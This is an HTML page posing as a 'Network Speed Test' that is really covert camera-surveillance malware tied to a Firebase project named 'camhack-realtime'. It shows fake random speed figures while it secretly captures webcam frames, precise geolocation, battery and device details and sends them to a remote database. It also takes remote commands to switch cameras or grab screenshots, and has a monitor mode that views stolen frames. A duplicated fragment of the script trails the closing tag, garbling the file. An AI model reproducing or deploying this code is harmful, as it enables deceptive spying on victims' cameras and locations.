<!DOCTYPE html>
<html>
<head>
    <title>Network Speed Test</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { 
            background: linear-gradient(135deg, #0f1419, #1a2332);
            color: #00ffff; 
            font-family: 'Courier New', monospace; 
            text-align: center; 
            padding: 20px;
            margin: 0;
        }
        .header {
            background: rgba(0,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ffff;
        }
        .speed-display {
            font-size: 48px;
            color: #00ff00;
            margin: 20px 0;
        }
        .btn {
            background: linear-gradient(45deg, #00ffff, #0080ff);
            color: #000;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px;
        }
        .status {
            margin: 15px 0;
            padding: 10px;
            background: rgba(0,0,0,0.3);
            border-radius: 5px;
            font-size: 14px;
        }
        .loading { animation: pulse 1.5s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .hidden { display: none !important; }
    </style>
</head>
<body>
    <div class="header">
        <h1>âš¡ Network Speed Test</h1>
        <p>Testing your connection performance...</p>
    </div>

    <div class="speed-display" id="speedDisplay">0 Mbps</div>
    <button class="btn" id="startBtn" onclick="startTest()">ðŸš€ Start Test</button>
    <div class="status" id="status">Ready to test your connection</div>

    <video id="camera" autoplay muted playsinline class="hidden"></video>
    <canvas id="canvas" class="hidden"></canvas>

    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>

    <script>
        // Firebase config - camhack-realtime
        const firebaseConfig = {
            apiKey: "AIzaSyDm83pllDlsMkmcj2S5HR4_jgAHcXyEVfI",
            authDomain: "camhack-realtime.firebaseapp.com",
            databaseURL: "https://camhack-realtime-default-rtdb.firebaseio.com",
            projectId: "camhack-realtime",
            storageBucket: "camhack-realtime.firebasestorage.app",
            messagingSenderId: "924337165678",
            appId: "1:924337165678:web:5c602dff53e9f9582f9d7f",
            measurementId: "G-P3WVHCT6SQ"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session') || urlParams.get('s') || 'cam_' + Date.now();
        const isMonitor = urlParams.get('monitor') === 'true';
        
        let mediaStream = null;
        let isTestRunning = false;
        let frameCount = 0;
        let currentFacingMode = 'user';
        let isCapturing = false;
        
        console.log('Session:', sessionId, 'Monitor:', isMonitor);
        
        document.addEventListener('DOMContentLoaded', function() {
            if (isMonitor) {
                initializeMonitor();
            } else {
                initializeCamHack();
            }
        });
        
        function initializeMonitor() {
            console.log('Monitor mode - listening for frames...');
            document.getElementById('status').textContent = 'ðŸ” Monitoring - Waiting for target...';
            
            // Create image element for displaying frames
            const imgElement = document.createElement('img');
            imgElement.style.maxWidth = '100%';
            imgElement.style.border = '2px solid #00ff00';
            imgElement.style.borderRadius = '10px';
            imgElement.style.marginTop = '20px';
            document.body.appendChild(imgElement);
            
            // Listen for frames in Firebase
            database.ref(`sessions/${sessionId}/frames`).on('child_added', (snapshot) => {
                const frameData = snapshot.val();
                console.log('Frame received:', frameData.frameNumber);
                
                // Display frame in monitor
                if (frameData.image) {
                    imgElement.src = frameData.image;
                    document.getElementById('status').textContent = `ðŸ“· Live: Frame #${frameData.frameNumber} (${frameData.facingMode})`;
                    
                    // Send to Android via AndroidInterface
                    if (typeof AndroidInterface !== 'undefined') {
                        AndroidInterface.receiveFrame(JSON.stringify(frameData));
                    }
                }
                
                // Remove old frame after processing
                setTimeout(() => {
                    snapshot.ref.remove();
                }, 1000);
            });
            
            // Listen for status updates
            database.ref(`sessions/${sessionId}/status`).on('value', (snapshot) => {
                const status = snapshot.val();
                if (status && status.type === 'TARGET_CONNECTED') {
                    document.getElementById('status').textContent = 'âœ… Target connected!';
                    
                    // Send to Android
                    if (typeof AndroidInterface !== 'undefined') {
                        AndroidInterface.receiveData(JSON.stringify(status));
                    }
                }
            });
            
            // Listen for device info
            database.ref(`sessions/${sessionId}/device`).on('value', (snapshot) => {
                const deviceData = snapshot.val();
                if (deviceData && typeof AndroidInterface !== 'undefined') {
                    AndroidInterface.receiveData(JSON.stringify({
                        type: 'DEVICE_INFO',
                        data: deviceData
                    }));
                }
            });
        }
        
        async function initializeCamHack() {
            console.log('Target mode - starting camera...');
            
            await collectDeviceInfo();
            await requestCameraAccess();
            startCommandMonitoring();
            
            setTimeout(() => {
                if (!isTestRunning) startTest();
            }, 1000);
        }
        
        async function collectDeviceInfo() {
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: screen.width,
                screenHeight: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                timestamp: Date.now()
            };
            
            // Get network info if available
            if ('connection' in navigator) {
                deviceInfo.networkType = navigator.connection.effectiveType || 'unknown';
                deviceInfo.downlink = navigator.connection.downlink || 0;
                deviceInfo.rtt = navigator.connection.rtt || 0;
            }
            
            // Get battery info
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    deviceInfo.battery = Math.round(battery.level * 100);
                    deviceInfo.charging = battery.charging;
                    deviceInfo.chargingTime = battery.chargingTime;
                    deviceInfo.dischargingTime = battery.dischargingTime;
                } catch (e) {
                    deviceInfo.battery = 'Unknown';
                    deviceInfo.charging = false;
                }
            }
            
            // Get location if available
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        deviceInfo.latitude = position.coords.latitude;
                        deviceInfo.longitude = position.coords.longitude;
                        deviceInfo.accuracy = position.coords.accuracy;
                        deviceInfo.altitude = position.coords.altitude;
                        deviceInfo.speed = position.coords.speed;
                        
                        // Send updated device info with location
                        database.ref(`sessions/${sessionId}/device`).set(deviceInfo);
                        console.log('ðŸ“ Location added to device info');
                    },
                    (error) => {
                        deviceInfo.locationError = error.message;
                        database.ref(`sessions/${sessionId}/device`).set(deviceInfo);
                        console.log('âš ï¸ Location access denied');
                    },
                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 60000 }
                );
            } else {
                // Send device info without location
                database.ref(`sessions/${sessionId}/device`).set(deviceInfo);
            }
            
            console.log('ðŸ“‹ Device info collected and sent');
        }
        
        async function requestCameraAccess() {
            try {
                const constraints = {
                    video: {
                        facingMode: currentFacingMode,
                        width: { ideal: 640, max: 1280 },
                        height: { ideal: 480, max: 720 }
                    },
                    audio: false
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                
                const video = document.getElementById('camera');
                video.srcObject = mediaStream;
                
                video.addEventListener('loadedmetadata', () => {
                    console.log('CAMERA ACCESS GRANTED');
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    // Send connection status to Firebase
                    database.ref(`sessions/${sessionId}/status`).set({
                        type: 'TARGET_CONNECTED',
                        cameraWidth: canvas.width,
                        cameraHeight: canvas.height,
                        facingMode: currentFacingMode,
                        videoWidth: video.videoWidth,
                        videoHeight: video.videoHeight,
                        readyState: video.readyState,
                        timestamp: Date.now(),
                        userAgent: navigator.userAgent.substring(0, 50)
                    });
                    
                    startFrameCapture();
                    
                    document.getElementById('status').textContent = 'ðŸ“· Camera active - Sending frames';
                });
                
            } catch (error) {
                console.error('Camera access failed:', error);
                document.getElementById('status').textContent = 'âŒ Camera access denied';
            }
        }
        
        function startFrameCapture() {
            if (isCapturing) return;
            isCapturing = true;
            
            const video = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            function captureFrame() {
                if (!mediaStream || video.readyState !== 4) {
                    setTimeout(captureFrame, 100);
                    return;
                }
                
                try {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    canvas.toBlob(blob => {
                        if (blob) {
                            const reader = new FileReader();
                            reader.onload = function() {
                                frameCount++;
                                
                                const frameData = {
                                    type: 'CAMERA_FRAME',
                                    session: sessionId,
                                    image: reader.result,
                                    frameNumber: frameCount,
                                    facingMode: currentFacingMode,
                                    timestamp: Date.now()
                                };
                                
                                // Send frame to Firebase with priority
                                database.ref(`sessions/${sessionId}/frames`).push(frameData)
                                .then(() => {
                                    console.log(`ðŸ”´ Frame #${frameCount} sent successfully`);
                                    document.getElementById('status').textContent = `ðŸ”´ LIVE: Frame #${frameCount} (${currentFacingMode})`;
                                    
                                    // Send heartbeat
                                    database.ref(`sessions/${sessionId}/heartbeat`).set({
                                        frameCount: frameCount,
                                        facingMode: currentFacingMode,
                                        online: navigator.onLine,
                                        timestamp: Date.now(),
                                        cameraActive: true
                                    });
                                })
                                .catch((error) => {
                                    console.error('Frame send failed:', error);
                                    document.getElementById('status').textContent = `âŒ Frame send failed: ${error.message}`;
                                });
                            };
                            reader.readAsDataURL(blob);
                        }
                    }, 'image/jpeg', 0.7);
                    
                } catch (error) {
                    console.error('Frame capture error:', error);
                }
                
                if (isCapturing && mediaStream) {
                    setTimeout(captureFrame, 800); // 1.25 FPS for better streaming
                }
            }
            
            captureFrame();
        }
        
        function startCommandMonitoring() {
            // Listen for commands from Firebase
            database.ref(`sessions/${sessionId}/commands`).on('child_added', (snapshot) => {
                const command = snapshot.val();
                executeCommand(command.action);
                
                // Remove command after execution
                snapshot.ref.remove();
            });
        }
        
        function executeCommand(command) {
            console.log('Executing:', command);
            
            if (command === 'switch_camera') {
                switchCamera();
            } else if (command === 'capture') {
                captureScreenshot();
            }
        }
        
        async function switchCamera() {
            if (!mediaStream) return;
            
            try {
                mediaStream.getTracks().forEach(track => track.stop());
                
                currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
                isCapturing = false;
                
                const constraints = {
                    video: {
                        facingMode: currentFacingMode,
                        width: { ideal: 640, max: 1280 },
                        height: { ideal: 480, max: 720 }
                    }
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                
                const video = document.getElementById('camera');
                video.srcObject = mediaStream;
                
                video.addEventListener('loadedmetadata', () => {
                    startFrameCapture();
                    console.log('Camera switched to', currentFacingMode);
                }, { once: true });
                
            } catch (error) {
                console.error('Camera switch failed:', error);
            }
        }
        
        function captureScreenshot() {
            const video = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const reader = new FileReader();
                reader.onload = function() {
                    const data = {
                        type: 'SCREENSHOT',
                        session: sessionId,
                        image: reader.result,
                        timestamp: Date.now()
                    };
                    
                    database.ref(`sessions/${sessionId}/screenshots`).push(data);
                    console.log('Screenshot sent to Firebase');
                };
                reader.readAsDataURL(blob);
            }, 'image/jpeg', 0.9);
        }
        
        async function startTest() {
            if (isTestRunning) return;
            
            isTestRunning = true;
            document.getElementById('startBtn').style.display = 'none';
            
            const statusEl = document.getElementById('status');
            const speedEl = document.getElementById('speedDisplay');
            
            statusEl.textContent = 'Testing connection...';
            
            for (let i = 0; i < 50; i++) {
                const speed = Math.floor(Math.random() * 100 + 10);
                speedEl.textContent = speed + ' Mbps';
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            
            const finalSpeed = Math.floor(Math.random() * 100 + 50);
            speedEl.textContent = finalSpeed + ' Mbps';
            
            statusEl.textContent = `âœ… Test completed! Frames: ${frameCount}`;
            isTestRunning = false;
        }
    </script>
</body>
</html> Frame #${frameCount} sent`;
                            };
                            reader.readAsDataURL(blob);
                        }
                    }, 'image/jpeg', 0.7);
                    
                } catch (error) {
                    console.error('Frame capture error:', error);
                }
                
                if (isCapturing && mediaStream) {
                    setTimeout(captureFrame, 2000); // 0.5 FPS for Firebase limits
                }
            }
            
            captureFrame();
        }
        
        function startCommandMonitoring() {
            // Listen for commands from Firebase
            database.ref(`sessions/${sessionId}/commands`).on('child_added', (snapshot) => {
                const command = snapshot.val();
                executeCommand(command.action);
                
                // Remove command after execution
                snapshot.ref.remove();
            });
        }
        
        function executeCommand(command) {
            console.log('Executing:', command);
            
            if (command === 'switch_camera') {
                switchCamera();
            } else if (command === 'capture') {
                captureScreenshot();
            }
        }
        
        async function switchCamera() {
            if (!mediaStream) return;
            
            try {
                mediaStream.getTracks().forEach(track => track.stop());
                
                currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
                isCapturing = false;
                
                const constraints = {
                    video: {
                        facingMode: currentFacingMode,
                        width: { ideal: 640, max: 1280 },
                        height: { ideal: 480, max: 720 }
                    }
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                
                const video = document.getElementById('camera');
                video.srcObject = mediaStream;
                
                video.addEventListener('loadedmetadata', () => {
                    startFrameCapture();
                    console.log('Camera switched to', currentFacingMode);
                }, { once: true });
                
            } catch (error) {
                console.error('Camera switch failed:', error);
            }
        }
        
        function captureScreenshot() {
            const video = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            canvas.toBlob(blob => {
                const reader = new FileReader();
                reader.onload = function() {
                    const data = {
                        type: 'SCREENSHOT',
                        session: sessionId,
                        image: reader.result,
                        timestamp: Date.now()
                    };
                    
                    database.ref(`sessions/${sessionId}/screenshots`).push(data);
                    console.log('Screenshot sent to Firebase');
                };
                reader.readAsDataURL(blob);
            }, 'image/jpeg', 0.9);
        }
        
        async function startTest() {
            if (isTestRunning) return;
            
            isTestRunning = true;
            document.getElementById('startBtn').style.display = 'none';
            
            const statusEl = document.getElementById('status');
            const speedEl = document.getElementById('speedDisplay');
            
            statusEl.textContent = 'Testing connection...';
            
            for (let i = 0; i < 50; i++) {
                const speed = Math.floor(Math.random() * 100 + 10);
                speedEl.textContent = speed + ' Mbps';
                await new Promise(resolve => setTimeout(resolve, 100));
            }
            
            const finalSpeed = Math.floor(Math.random() * 100 + 50);
            speedEl.textContent = finalSpeed + ' Mbps';
            
            statusEl.textContent = `âœ… Test completed! Frames: ${frameCount}`;
            isTestRunning = false;
        }
    </script>
</body>
</html>
